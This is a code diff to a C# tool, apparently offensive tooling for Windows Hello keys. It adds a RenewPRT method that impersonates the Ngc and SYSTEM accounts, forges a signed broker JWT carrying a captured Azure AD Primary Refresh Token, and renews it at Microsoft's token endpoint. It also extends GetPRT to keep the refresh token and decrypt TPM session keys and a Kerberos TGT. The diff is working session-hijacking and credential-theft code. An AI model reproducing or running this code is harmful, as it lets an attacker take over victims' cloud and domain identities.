@@ -60,6 +60,9 @@ namespace Shwmae.Ngc.Keys {
         public string PartialTGT { get; private set; }
         public string PRT { get; private set; }
         public string TransportKeyName { get; private set; }
+        public byte[] PopSessionKey { get; private set; }
+        public byte[] Ctx { get; private set;}
+        public string PRTRefreshToken { get; private set; }
 
         public AzureADKey(NgcContainer user, string path) : base(user, path) {
 
@@ -202,6 +205,7 @@ namespace Shwmae.Ngc.Keys {
                 .Encode();
         }
 
+        
         public static X509Certificate2 FindDeviceCert() {
 
             using (var joinInfo = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\CloudDomainJoin\JoinInfo")) {
@@ -221,6 +225,56 @@ namespace Shwmae.Ngc.Keys {
             }
         }
 
+        public string RenewPRT(byte[] derivedKey) {
+
+            var tokenURL = $"https://login.microsoftonline.com/{TenantId}/oauth2/token";
+            var httpClient = new HttpClient();
+            var response = httpClient.PostAsync(tokenURL,
+                new FormUrlEncodedContent(new KeyValuePair<string, string>[] { new KeyValuePair<string, string>("grant_type", "srv_challenge") }))
+                .Result.Content.ReadAsStringAsync().Result;
+
+            var obj = JsonConvert.DeserializeObject<dynamic>(response);
+            string prtRenewJWT = null;
+
+            using (var ctx = Utils.Impersonate("Ngc")) {
+
+                var sessionCtx = new byte[24];
+                new Random().NextBytes(sessionCtx);
+                var dateTimeProvider = new UtcDateTimeProvider();
+
+                prtRenewJWT = JwtBuilder.Create()
+                            .AddHeader("ctx", Convert.ToBase64String(sessionCtx))
+                            .AddHeader("kdf_ver", "1")
+
+                            .AddClaim("request_nonce", (string)obj.Nonce)
+                            .AddClaim("scope", "openid aza ugs")
+                            .AddClaim("win_ver", "10.0.22621.2792")
+                            .AddClaim("grant_type", "refresh_token")
+                            .AddClaim("iss", "aad:brokerplugin")
+                            .AddClaim("group_sids", new string[] { })
+                            .AddClaim("client_id", "38aa3b87-a06d-4817-b275-7a316988d93b")
+                            .AddClaim("refresh_token", PRTRefreshToken)
+                            .AddClaim("previous_refresh_token", PRTRefreshToken)
+
+                            .WithAlgorithm(new HMACSHA256Algorithm())
+                            .WithDateTimeProvider(dateTimeProvider)
+                            .WithSecret(derivedKey)
+                            .Encode();
+            }
+     
+            response = httpClient.PostAsync(tokenURL,
+                new FormUrlEncodedContent(new KeyValuePair<string, string>[] {
+                new KeyValuePair<string, string>("request", prtRenewJWT),
+                new KeyValuePair<string, string>("windows_api_version", "2.2"),
+                new KeyValuePair<string, string>("grant_type", "urn:ietf:params:oauth:grant-type:jwt-bearer"),
+                new KeyValuePair<string, string>("client_info", "1"),
+                }))
+                .Result.Content.ReadAsStringAsync().Result;
+
+            
+            return response;
+        }
+
         public void GetPRT(NgcProtector ngcKeySet, IMasterKeyProvider masterKeyProvider, RSACng deviceKey, X509Certificate2 deviceCert) {
 
             var tokenURL = $"https://login.microsoftonline.com/{TenantId}/oauth2/token";
@@ -235,7 +289,7 @@ namespace Shwmae.Ngc.Keys {
             using (var ctx = Utils.Impersonate("Ngc")) {
 
                 var prtRequestJwt = GeneratatePRTRequestJWT(ngcKeySet, deviceKey, deviceCert, masterKeyProvider, (string)obj.Nonce);
-
+                
                 response = httpClient.PostAsync(tokenURL,
                     new FormUrlEncodedContent(new KeyValuePair<string, string>[] {
                     new KeyValuePair<string, string>("request", prtRequestJwt),
@@ -249,16 +303,22 @@ namespace Shwmae.Ngc.Keys {
                 prt = JsonConvert.DeserializeObject<dynamic>(response);                
             }
 
+            PRTRefreshToken = prt["refresh_token"];
             var sessionKey = (string)prt.session_key_jwe;
             var encryptedKey = Utils.Base64Url(sessionKey.Split(new char[] { '.' })[1]);
             var tgt_ad = JsonConvert.DeserializeObject<dynamic>((string)prt.tgt_ad);
             var tgt_key = Jose.JWT.Headers((string)tgt_ad.clientKey);
             var tgt_token = Jose.JweToken.FromString((string)tgt_ad.clientKey);
 
-            using (var ctx = Utils.Impersonate("SYSTEM")) {              
-                var decryptedTPMSessionKey = DecryptSessionKey(encryptedKey);
-                var popSessionKey = GetDerivedKeyFromSessionKey((string)tgt_key["ctx"], encryptedKey);
-                var tgtSessionKey = Utils.AesDecrypt(tgt_token.Ciphertext, popSessionKey, tgt_token.Iv);
+            using (var impersonteCtx = Utils.Impersonate("SYSTEM")) {
+
+                Ctx = new byte[24];
+                new Random().NextBytes(Ctx);
+                PopSessionKey = GetDerivedKeyFromSessionKey(Convert.ToBase64String(Ctx), encryptedKey);
+
+                var tgtpopSessionKey = GetDerivedKeyFromSessionKey((string)tgt_key["ctx"], encryptedKey);
+                var decryptedTPMSessionKey = DecryptSessionKey(encryptedKey);                
+                var tgtSessionKey = Utils.AesDecrypt(tgt_token.Ciphertext, tgtpopSessionKey, tgt_token.Iv);
                 var tgtCrypto = CryptoService.CreateTransform(EncryptionType.AES256_CTS_HMAC_SHA1_96);
                 var asRep = KrbAsRep.DecodeApplication(Convert.FromBase64String((string)tgt_ad.messageBuffer));
                 var krbCred = tgtCrypto.Decrypt(asRep.EncPart.Cipher, new KerberosKey(tgtSessionKey), KeyUsage.EncAsRepPart);
